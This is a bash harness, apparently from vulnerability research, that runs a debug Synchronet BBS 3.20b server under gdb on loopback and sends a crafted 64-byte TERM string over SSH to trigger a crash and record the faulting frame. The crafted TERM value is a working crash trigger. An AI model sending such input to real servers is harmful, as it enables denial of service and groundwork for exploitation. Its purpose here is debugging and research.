#!/usr/bin/env bash
# W21: replay the shipped 3.20b chosen-64-byte TERM under gdb to identify the
# live faulting frame. Uses the already-built probe binary, loopback only.
set -uo pipefail
cd "$(dirname "$0")/../../.."
HERE=$PWD
TREE=$HERE/src-tree/320b
P=$HERE/provision
L=$P/local/usr/lib/x86_64-linux-gnu
E=$HERE/release-label/term320b/real320b/evidence
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
LOG=$E/gdb-vuln.log
CLIENT=$E/client-gdb.log
: > "$LOG"
: > "$CLIENT"
CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"

(cd "$TREE" && SBBSCTRL="$TREE/ctrl" gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'run' \
    -ex 'printf "\n=== W21_BACKTRACE_BEGIN ===\n"' \
    -ex 'bt 30' \
    -ex 'frame 0' \
    -ex 'printf "W21_FAULT_LIST_FIRST=%p W21_FAULT_NODE=%p\n", list->first, node' \
    -ex 'printf "\n=== W21_BACKTRACE_END ===\n"' \
    --args "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs" nd nh nj ne \
    > "$LOG" 2>&1) &
GPID=$!
for i in $(seq 1 60); do
    grep -q 'SSH Server listening' "$LOG" && break
    sleep 0.5
done
(for i in $(seq 1 4); do echo x; sleep 0.2; done) | \
    TERM="$CHOSEN" timeout 14 ssh -tt \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=none -o PubkeyAuthentication=no \
      -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
      -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
      -p 22234 lab@127.0.0.1 > "$CLIENT" 2>&1 || true
wait "$GPID" || true
printf '%s\n' "gdb driver finished $(date -u +%FT%TZ)"
grep -n 'REAL_320B_PROBE' "$LOG" | head -3 || true
grep -n -A36 'W21_BACKTRACE_BEGIN' "$LOG" | head -44 || true
cp "$LOG" "$E/gdb-vuln-final.log"
